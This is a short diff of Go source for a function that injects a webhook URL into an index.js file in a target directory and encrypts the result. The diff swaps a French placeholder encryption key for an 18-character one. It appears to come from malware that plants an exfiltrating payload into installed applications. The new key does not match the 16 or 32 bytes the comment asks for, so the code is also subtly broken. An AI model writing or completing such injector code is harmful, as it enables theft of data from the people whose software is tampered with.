@@ -79,7 +79,7 @@ func injectFile(directory string, injectionURL string, webhook string) error {
 	body = bytes.Replace(body, []byte("%WEBHOOK%"), []byte(webhook), 1)
 
 	// Générer une clé de chiffrement
-	encryptionKey := []byte("votre_clé_de_chiffrement_secrète_de_longueur_16_ou_32_octets")
+	encryptionKey := []byte("aunommintctropbien")
 
 	// Chiffrer le contenu du fichier index.js
 	encryptedBody, err := encrypt(body, encryptionKey)
